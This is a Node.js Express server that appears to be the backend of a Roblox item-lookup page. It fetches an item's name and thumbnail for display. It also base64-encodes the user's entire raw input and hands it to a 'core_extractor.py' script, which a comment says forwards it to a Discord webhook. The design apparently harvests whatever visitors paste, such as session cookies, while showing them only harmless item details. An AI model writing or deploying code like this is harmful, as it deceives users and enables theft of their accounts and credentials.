const express = require('express');
const { spawn } = require('child_process');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/process', async (req, res) => {
    const rawInput = req.body.data;
    if (!rawInput) {
        return res.json({ success: false, error: "No input provided" });
    }

    // Extract numbers (Item ID) from the input (handles URLs or raw IDs)
    const match = rawInput.match(/\d{5,}/);
    const itemId = match ? match[0] : "13961116"; // Fallback ID if none found

    let itemName = "Roblox Item";
    let itemThumb = "https://www.roblox.com";

    try {
        // Fetch item details from Roblox catalog API
        const infoRes = await axios.get(`https://economy.roblox.com/v2/assets/${itemId}/details`, { timeout: 5000 });
        if (infoRes.data && infoRes.data.Name) {
            itemName = infoRes.data.Name;
        }

        // Fetch item thumbnail image
        const thumbRes = await axios.get(`https://thumbnails.roblox.com/v1/assets?assetIds=${itemId}&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false`, { timeout: 5000 });
        if (thumbRes.data && thumbRes.data.data && thumbRes.data.data.length > 0) {
            itemThumb = thumbRes.data.data[0].imageUrl;
        }
    } catch (e) {
        // Fallback thumbnail if API fails
        itemThumb = `https://www.roblox.com/asset-thumbnail/image?assetId=${itemId}&width=420&height=420&format=png`;
    }

    // Base64 encode the payload safely so Python doesn't throw base64 decode errors
    const encodedPayload = Buffer.from(`ITEM_ID:${itemId} | INPUT:${rawInput}`).toString('base64');

    // Spawn Python extractor script to send report to Discord webhook
    const pythonProcess = spawn('python3', ['core_extractor.py', encodedPayload]);

    let pythonError = '';
    pythonProcess.stderr.on('data', (data) => {
        pythonError += data.toString();
    });

    pythonProcess.on('close', (code) => {
        console.log(`Python process finished with code ${code}`);
        res.json({ 
            success: true, 
            code: code, 
            itemId: itemId,
            itemName: itemName,
            itemThumb: itemThumb
        });
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
